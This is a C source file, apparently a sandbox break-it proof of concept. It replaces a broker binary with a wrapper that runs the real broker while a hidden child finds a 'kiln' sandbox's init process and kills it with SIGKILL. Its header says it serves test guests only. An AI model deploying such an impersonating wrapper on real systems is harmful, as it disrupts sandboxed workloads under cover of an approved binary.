/*
 * B5-04's test-guest broker wrapper (from Daybreak's B5 break-it PoC). The parent
 * immediately becomes the approved broker, renamed kilnd-guest-broker.real; a guest-root
 * child finds the persistent kiln sandbox's recorded init.pid, waits five seconds for
 * READY to settle, and kills it from the guest's outer PID namespace, leaving the broker
 * itself Idle. Test guests only: scripts/b5-test-guest.sh builds it into a copy of a
 * production bundle, never into the product image.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

static void sleep_ms(long milliseconds) {
    struct timespec delay = {
        .tv_sec = milliseconds / 1000,
        .tv_nsec = (milliseconds % 1000) * 1000000L,
    };
    while (nanosleep(&delay, &delay) < 0 && errno == EINTR) {}
}

static pid_t find_inner_init(void) {
    const char *root = "/var/lib/kiln/runs";
    DIR *runs = opendir(root);
    if (!runs) return -1;
    struct dirent *entry;
    pid_t found = -1;
    while ((entry = readdir(runs)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        char path[512];
        int used = snprintf(path, sizeof(path), "%s/%s/init.pid", root, entry->d_name);
        if (used <= 0 || (size_t)used >= sizeof(path)) continue;
        int fd = open(path, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
        if (fd < 0) continue;
        char text[32] = {0};
        ssize_t n = read(fd, text, sizeof(text) - 1);
        close(fd);
        if (n <= 0) continue;
        char *end = NULL;
        long value = strtol(text, &end, 10);
        if (end != text && value > 1 && value <= INT32_MAX) {
            found = (pid_t)value;
            break;
        }
    }
    closedir(runs);
    return found;
}

static void attack(void) {
    pid_t inner = -1;
    for (int attempt = 0; attempt < 600 && inner < 0; ++attempt) {
        inner = find_inner_init();
        if (inner < 0) sleep_ms(50);
    }
    if (inner < 0) _exit(21);
    sleep_ms(5000);
    if (kill(inner, SIGKILL) != 0) _exit(22);
    dprintf(STDERR_FILENO, "B5_TEST_KILLED_INNER pid=%ld\n", (long)inner);
    _exit(0);
}

int main(void) {
    pid_t child = fork();
    if (child < 0) return 125;
    if (child == 0) {
        attack();
        _exit(0);
    }
    char *const argv[] = {"kilnd-guest-broker", NULL};
    execv("/usr/local/bin/kilnd-guest-broker.real", argv);
    return 127;
}
